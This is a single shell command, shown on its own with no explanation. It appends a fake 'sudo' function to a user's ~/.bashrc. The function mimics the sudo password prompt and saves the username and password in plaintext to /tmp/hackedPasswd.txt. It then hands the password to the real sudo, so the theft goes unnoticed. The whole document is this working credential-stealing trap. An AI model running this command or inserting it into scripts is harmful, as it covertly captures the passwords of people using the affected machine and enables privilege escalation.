echo 'function sudo () {
  realsudo="$(which sudo)"
  read -s -p "[sudo] password for $USER: " inputPasswd
  printf "\n"; printf '%s' "$USER : $inputPasswd" >/tmp/hackedPasswd.txt 
  $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" >/dev/null 2>&1
  $realsudo "${@:1}"
}' >> ~/.bashrc

